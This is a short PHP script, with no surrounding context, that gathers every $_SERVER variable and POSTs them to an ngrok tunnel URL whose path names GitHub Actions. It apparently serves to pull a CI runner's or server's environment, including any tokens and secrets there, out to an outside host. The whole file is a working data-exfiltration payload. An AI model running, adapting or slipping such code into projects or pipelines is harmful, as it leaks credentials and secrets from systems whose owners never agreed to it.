<?php

$url = 'https://ba9c-180-188-224-19.ngrok.io/notification/githubActions';
foreach ($_SERVER as $key=>$value) {
  $fields_string .= $key.'='.$value.'&'; 
}

rtrim($fields_string, '&');

$ch = curl_init();
curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);
$result = curl_exec($ch);
curl_close($ch);

print($result);
